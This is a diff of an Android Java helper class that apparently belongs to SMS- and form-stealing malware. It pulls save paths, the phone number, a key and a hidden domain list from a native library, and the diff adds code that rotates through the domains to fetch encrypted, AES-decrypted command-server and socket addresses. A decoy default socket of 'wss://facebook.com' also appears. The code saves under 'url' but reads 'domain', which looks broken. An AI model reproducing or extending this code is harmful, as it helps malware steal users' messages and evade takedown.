@@ -19,6 +19,8 @@ import android.widget.Toast;
 
 import androidx.core.app.ActivityCompat;
 
+
+import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedWriter;
@@ -31,6 +33,7 @@ import java.time.format.DateTimeFormatter;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
+import java.util.Objects;
 import java.util.Scanner;
 
 
@@ -40,31 +43,23 @@ public class Helper {
     {
         System.loadLibrary("native-lib");
     }
-    public  native String SMSSavePath();
-    public  native String FormSavePath();
-    public  native String URL();
+
     public  native String SITE();
     public  native String KEY();
+    public native String SMSSavePath();
+    public native String FormSavePath();
     public native String getNumber();
-    public native String SocketUrl();
+    public native String DomainList();
 
-
-    public static void postRequest(String path, JSONObject jsonData, ResponseListener listener) {
+    public static void postRequest(String path, JSONObject jsonData, Context context, ResponseListener listener) {
         new AsyncTask<String, Void, String>() {
             @Override
             protected String doInBackground(String... params) {
                 String response = "";
                 try {
                     Helper helper = new Helper();
-                    String urlString = helper.URL() + path;
+                    String urlString = helper.URL(context) + path;
                     URL url = new URL(urlString);
-//
-//                    String plain_text = jsonData.toString();
-//                    JSONObject encData = new JSONObject();
-//                    String plain_text_enc  = Security.encrypt(plain_text, helper.KEY());
-//                    encData.put("payload", plain_text_enc);
-//                    encData.put("secure", true);
-
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("POST");
                     conn.setRequestProperty("Content-Type", "application/json");
@@ -118,14 +113,14 @@ public class Helper {
         void onResponse(String result);
     }
 
-    public static void getRequest(String path, ResponseListener listener) {
+    public static void getRequest(String path, Context context, ResponseListener listener) {
         new AsyncTask<String, Void, String>() {
             @Override
             protected String doInBackground(String... params) {
                 String response = "";
                 try {
                     Helper helper = new Helper();
-                    String urlString = helper.URL() + path; // Append the path to the base URL
+                    String urlString = helper.URL(context) + path; // Append the path to the base URL
                     URL url = new URL(urlString);
 
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -165,35 +160,6 @@ public class Helper {
         }.execute(path);
     }
 
-
-
-    public static String datetime() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            LocalDateTime now = LocalDateTime.now();
-            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("dd/MM/yyyy h:mm:ss a");
-            return now.format(formatter);
-        } else {
-            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy h:mm:ss a", Locale.getDefault());
-            return sdf.format(new Date());
-        }
-    }
-
-    public static void debug(Context context, String message){
-        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
-        StackTraceElement element = stackTraceElements[3];
-        String FileName = element.getFileName();
-        int Line = element.getLineNumber();
-        Toast.makeText(context, Line+FileName+" : " +message, Toast.LENGTH_SHORT).show();
-        Log.d(Helper.TAG, Line+FileName +" : " + message);
-    }
-
-    public static void debug(String message){
-        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
-        StackTraceElement element = stackTraceElements[3];
-        String FileName = element.getFileName();
-        int Line = element.getLineNumber();
-        Log.d(Helper.TAG, Line+FileName +" : " + message);
-    }
 
     public static boolean isNetworkAvailable(Context context) {
         ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -260,6 +226,60 @@ public class Helper {
             return "TelephonyManager is null";
         }
     }
+
+    public void updateDomain(final Context cc) {
+        final SharedPreferencesHelper db = new SharedPreferencesHelper(cc);
+        final NetworkHelper network = new NetworkHelper();
+        final Helper help = new Helper();
+        String DomainList = help.DomainList();
+        final String[] domainArray = DomainList.split(", ");
+        checkDomainSequentially(0, domainArray, db, network);
+    }
+
+    private void checkDomainSequentially(final int index, final String[] domainArray, final SharedPreferencesHelper db, final NetworkHelper network) {
+        if (index >= domainArray.length) {
+            db.saveString("domainStatus", "failed");
+            return;
+        }
+        final String currentDomain = domainArray[index];
+        network.makeGetRequest(currentDomain, new NetworkHelper.GetRequestCallback() {
+            @Override
+            public void onSuccess(String result) {
+                String encryptedData = result.trim(); // Trim to remove leading/trailing whitespaces
+                Log.d(Helper.TAG, "Encrypted Body"+encryptedData);
+                try {
+                        Helper h = new Helper();
+                        String decryptedData = AESDescryption.decrypt(encryptedData, h.KEY());
+                        if (!decryptedData.isEmpty()) {
+                            JSONObject object = new JSONObject(decryptedData);
+                            db.saveString("url", object.getString("domain"));
+                            db.saveString("socket", object.getString("socket"));
+                        }
+                    } catch (Exception e) {
+                        throw new RuntimeException(e);
+                    }
+            }
+
+            @Override
+            public void onFailure(String error) {
+                Log.d("NetworkRequest", "Failed for domain: " + currentDomain + " Error: " + error);
+                checkDomainSequentially(index + 1, domainArray, db, network);
+            }
+        });
+    }
+
+    public String URL(Context context) {
+        SharedPreferencesHelper share = new SharedPreferencesHelper(context);
+        String domain = share.getString("domain", "https://example.com").trim();
+        return domain;
+    }
+
+    public String SocketUrl(Context context)  {
+        SharedPreferencesHelper share = new SharedPreferencesHelper(context);
+        String domain = share.getString("socket", "wss://facebook.com").trim();
+        return domain;
+    }
+
 
 
 }
